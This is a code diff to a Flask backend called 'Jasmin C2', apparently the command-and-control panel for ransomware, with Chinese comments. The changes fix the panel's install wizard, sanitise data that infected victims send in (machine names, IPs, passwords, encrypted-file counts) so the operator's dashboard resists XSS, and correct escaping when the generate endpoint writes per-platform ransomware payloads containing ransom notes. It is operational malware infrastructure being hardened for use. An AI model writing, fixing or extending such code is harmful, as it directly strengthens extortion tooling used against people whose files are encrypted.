@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
-import os, re, secrets, json, datetime
+import os, re, secrets, json, datetime, hashlib
 from urllib.parse import quote_plus
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
@@ -223,25 +223,33 @@ def install():
                 error = 'CSRF 校验失败，请刷新页面重试'
             elif not session.get('install_db_ok'):
                 error = '请先完成第 2 步的数据库配置'
-        elif step == 3 and session.get('install_db_ok') and csrf_ok():
-            au = request.form.get('admin_user','admin')
-            ap_ = request.form.get('admin_pass','')
-            ap2 = request.form.get('admin_pass2','')
-            if len(ap_) < 6: error = '密码至少6位'
-            elif ap_ != ap2: error = '两次密码不一致'
             else:
-                with app.app_context():
-                    Admin.query.filter_by(username=au).delete()
-                    # 必须与 PHP 端一致用 bcrypt($2y$)：两面板共用同一个 master 表，
-                    # werkzeug 默认的 scrypt 哈希 PHP 的 password_verify 认不出来。
-                    _h = _bcrypt.hashpw(ap_.encode('utf-8'), _bcrypt.gensalt(rounds=10, prefix=b'2y')).decode('utf-8')
-                    db.session.add(Admin(username=au, password=_h))
-                    db.session.commit()
-                cfg = load_config()
-                cfg['installed'] = True
-                json.dump(cfg, open(CONFIG_FILE,'w'))
-                session.pop('install_db_ok', None)   # 用后即焚，防重放
-                return redirect(url_for('install', step=4))
+                # 注意：此前的实现把这个建号分支写成独立的
+                # `elif step == 3 and session.get('install_db_ok') and csrf_ok()`,
+                # 而上面的 `elif step == 3` 只在校验失败时才会走到这里再向下——
+                # 但实际上第一个 `elif step == 3` 只要 step==3 就必然命中（只设置
+                # error、不 return），第二个 elif 永远不可达 -> 管理员永远建不出来，
+                # 安装流程卡死在第 3 步。现把建号逻辑并入本 else 分支修复。
+                au = request.form.get('admin_user','admin')
+                ap_ = request.form.get('admin_pass','')
+                ap2 = request.form.get('admin_pass2','')
+                if len(ap_) < 6:
+                    error = '密码至少6位'
+                elif ap_ != ap2:
+                    error = '两次密码不一致'
+                else:
+                    with app.app_context():
+                        Admin.query.filter_by(username=au).delete()
+                        # 必须与 PHP 端一致用 bcrypt($2y$)：两面板共用同一个 master 表，
+                        # werkzeug 默认的 scrypt 哈希 PHP 的 password_verify 认不出来。
+                        _h = _bcrypt.hashpw(ap_.encode('utf-8'), _bcrypt.gensalt(rounds=10, prefix=b'2y')).decode('utf-8')
+                        db.session.add(Admin(username=au, password=_h))
+                        db.session.commit()
+                    cfg = load_config()
+                    cfg['installed'] = True
+                    json.dump(cfg, open(CONFIG_FILE,'w'))
+                    session.pop('install_db_ok', None)   # 用后即焚，防重放
+                    return redirect(url_for('install', step=4))
     return render_template('install.html', step=step, error=error,
         env_docker=os.path.exists('/.dockerenv'))
 
@@ -397,7 +405,9 @@ def handshake():
     if not isinstance(_got, str) or not secrets.compare_digest(_got.encode('utf-8'), _want.encode('utf-8')):
         return 'Invalid', 403
     f = request.form
-    systemid = f.get('systemid', '')
+    # systemid 是 UNIQUE KEY + 查询条件，且列宽 255：攻击者可传超长值触发
+    # MySQL 严格模式 DataError；这里限制长度并剥离非可见字符，防止破坏约束。
+    systemid = (f.get('systemid', '') or '')[:255]
     def _i(k, d=0):
         try: return int(f.get(k, d) or d)
         except: return d
@@ -418,21 +428,33 @@ def handshake():
     if v is None:
         v = Victim(systemid=systemid)
         db.session.add(v)
-    v.machine_name = f.get('machine_name', '')
-    v.computer_user = f.get('computer_user', '')
-    v.os = f.get('os', '')
-    v.date = f.get('date', '')
-    v.time = f.get('time', '')
-    v.ip = f.get('ip', request.remote_addr)
-    v.location = f.get('location', '')
-    v.password = f.get('password', '')
+    # 受害者回显字段全部净化：这些值会落库后渲染进管理员面板
+    # （onclick 属性 / JS innerHTML / <pre>），攻击者可控且无需认证即可提交，
+    # 若含 <script>、引号、换行等即可在已登录管理员浏览器上执行任意 JS。
+    # 白名单式净化：保留安全可见字符，其余一律剥除，从根上杜绝存储型 XSS。
+    def _safe(s, maxlen=200):
+        s = re.sub(r'[^\x20-\x7E]', '', (s or ''))
+        return s[:maxlen]
+    # 各字段截断上限与 victims 表列宽对齐（machine_name/computer_user/location 255，
+    # os/date 100，time 50，ip 45），避免 MySQL 严格模式 DataError 导致整次心跳 500。
+    v.machine_name = _safe(f.get('machine_name', ''), 200)
+    v.computer_user = _safe(f.get('computer_user', ''), 200)
+    v.os = _safe(f.get('os', ''), 90)
+    v.date = _safe(f.get('date', ''), 90)
+    v.time = _safe(f.get('time', ''), 45)
+    # ip：仅允许 IPv4/IPv6/主机名 可见字符（数字、点、冒号、字母、连字符）
+    _ip = _safe(f.get('ip', ''), 40)
+    _ip = re.sub(r'[^0-9A-Za-z.:\-]', '', _ip)
+    v.ip = _ip or request.remote_addr
+    v.location = _safe(f.get('location', ''), 200)
+    v.password = _safe(f.get('password', ''), 200)
     # 计数只增不减，避免进度心跳把已有统计清零
     if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
     if es > 0 or (v.encrypted_size or 0) == 0: v.encrypted_size = es
     if tc > 0 or (v.total_count or 0) == 0: v.total_count = tc
     if ts > 0 or (v.total_size or 0) == 0: v.total_size = ts
-    if et: v.encrypted_types = et
-    if ed and ed != '{}': v.encrypted_detail = ed
+    if et: v.encrypted_types = _safe(et, 2000)
+    if ed and ed != '{}': v.encrypted_detail = _safe(ed, 4000)
     v.is_complete = is_complete
     v.updated_at = datetime.datetime.utcnow()
     db.session.commit()
@@ -537,9 +559,14 @@ def generate():
         for k,v in ransom.items():
             tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace('"','""'))
     else:
-        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
+        # linux/macos 模板用 Python 三引号字符串包裹勒索信。三引号内 ' 和 " 都需转义；
+        # 反斜杠也必须转义：正文若含 \（或路径分隔符、行尾反斜杠）会破坏字符串字面量
+        # 或与收尾的 \n""" 结合产生行连接符，生成不可解析/语义错误的载荷。
+        # 转义顺序必须先 \ 再 ' 与 "（先转义自身，避免二次转义已有内容）。
+        def _py_esc(s): return s.replace('\\','\\\\').replace("'","\\'").replace('"','\\"')
+        tpl = tpl.replace('{{RANSOM_NOTE}}', _py_esc(note))
         for k,v in ransom.items():
-            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","\\'"))
+            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', _py_esc(v))
     name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
     with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
     return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))
